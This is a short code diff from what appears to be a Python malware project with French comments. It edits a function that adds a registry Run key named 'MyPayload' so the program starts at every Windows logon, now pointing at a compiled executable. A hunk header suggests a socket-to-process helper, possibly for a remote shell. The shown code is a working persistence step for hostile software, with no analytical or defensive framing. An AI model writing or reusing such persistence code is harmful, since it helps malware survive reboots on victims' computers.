@@ -25,15 +25,12 @@ def p2s(s, p, addr):
 
 def add_to_startup():
     try:
-    # Chemin complet du script Python
-        script_path = os.path.abspath(__file__)
-        
-        # Clé du registre pour l'exécution au démarrage
+    # Clé du registre pour l'exécution au démarrage
         key = reg.HKEY_CURRENT_USER
         key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         
         key_obj = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
-        reg.SetValueEx(key_obj, "MyPayload", 0, reg.REG_SZ, script_path)
+        reg.SetValueEx(key_obj, "MyPayload", 0, reg.REG_SZ, executable_path)
         reg.CloseKey(key_obj)
     except Exception as e:
         print(f"Error adding to startup: {e}")
